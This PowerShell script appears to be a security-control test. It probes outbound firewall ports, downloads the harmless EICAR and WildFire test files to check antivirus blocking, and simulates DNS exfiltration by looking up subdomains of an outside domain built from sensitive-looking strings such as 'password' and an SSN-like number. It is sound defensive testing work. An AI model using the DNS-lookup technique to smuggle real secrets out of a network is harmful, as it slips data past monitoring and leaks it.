#Egress Enumeration only via PSv3+ must run with Set-Execution -bypass in CLI for automation
#local admin required for trace capture
#Dennis Chow 05-Dec-2018

#Args
Param([string]$rhosts)

$timestamp = Get-Date -f yyyy-MM-dd_HH-mm-ss
$dports = @(80,443,8080,666,9090,1024)
$dlpStr = @("ssn", "password", "confidential", "4904-1510-3821-3872", "642-64-4761")

#Testing for firewall ports outbound
Write-Host "Testing egress filtering on different ports" -ForegroundColor Yellow -BackgroundColor Black
ForEach ($i in $dports)
{
     Test-NetConnection -ComputerName "portquiz.net" -Port $i | Where-Object -Property TcpTestSucceeded -NotLike "False" | `
     Format-Table ComputerName, RemoteAddress, RemotePort, TcpTestSucceeded | Tee-Object -FilePath "ps-enum-results.log" -Append
    
}
Write-Host "Egress ports Written to ps-enum-results.log" -ForegroundColor Green -BackgroundColor Black


Write-Host "Testing alt-DNS recursion and exfil with DLP chars" -ForegroundColor Yellow -BackgroundColor Black
Write-Host "Starting packet trace..." -ForegroundColor Green -BackgroundColor Black

#Replacement for Netsh
New-NetEventSession -Name "DNSExfil" -CaptureMode SaveToFile -LocalFilePath "DNSExfil.etl"
Add-NetEventPacketCaptureProvider -SessionName "DNSExfil" -Level 4 -CaptureType Physical -IpAddresses 1.1.1.1 -IpProtocols 6,17

ForEach ($i in $dlpStr)
{
    Write-Host "Invoking Fake DNS TCP Port 53 Lookup to CloudFlare $i.xtecsystems.com"
    Invoke-Command { nslookup -vc "$i.xtecsystems.com" 1.1.1.1}
}

Write-Host "Stopping packet trace..." -ForegroundColor Red -BackgroundColor Black
Write-Host "Trace written to: DNSExfil.etl" -ForegroundColor Green -BackgroundColor Black
Stop-NetEventSession -Name "DNSExfil"
Remove-NetEventSession -Name "DNSExfil"

#Testing IPS AV Policies Enforcement
Write-Host "Testing IPS AV enforcement with EICAR and WildFire..." -ForegroundColor Yellow -BackgroundColor Black

Write-Host "Testing SSL Channel PE and EICAR download" -ForegroundColor Yellow -BackgroundColor Black
Invoke-WebRequest -Uri "https://wildfire.paloaltonetworks.com/publicapi/test/pe" -PassThru -Verbose | Tee-Object -FilePath "ps-enum-results.log" -Append
Invoke-WebRequest -Uri "https://secure.eicar.org/eicar_com.zip" -PassThru -Verbose | Tee-Object -FilePath "ps-enum-results.log" -Append

Write-Host "Testing HTTP Channel PE and EICAR download" -ForegroundColor Yellow -BackgroundColor Black
Invoke-WebRequest -Uri "http://wildfire.paloaltonetworks.com/publicapi/test/pe" -Verbose | Tee-Object -FilePath "ps-enum-results.log" -Append
Invoke-WebRequest -Uri "http://2016.eicar.org/download/eicar_com.zip" -Verbose | Tee-Object -FilePath "ps-enum-results.log" -Append

Write-Host "Testing REST API Method of Grabbing Test PE Europe and US" -ForegroundColor Yellow -BackgroundColor Black
Invoke-RestMethod -Method Get -Uri "https://eu.wildfire.paloaltonetworks.com/publicapi/test/pe" -Verbose | Tee-Object -FilePath "ps-enum-results.log" -Append
Invoke-RestMethod -Method Get -Uri "https://wildfire.paloaltonetworks.com/publicapi/test/pe"  -Verbose | Tee-Object -FilePath "ps-enum-results.log" -Append

Write-Host "Capturing ICMP traceroute" -ForegroundColor Yellow -BackgroundColor Black
Test-NetConnection -ComputerName microsoft.com -TraceRoute -Hops 16 -Verbose | Tee-Object -FilePath "ps-enum-results.log" -Append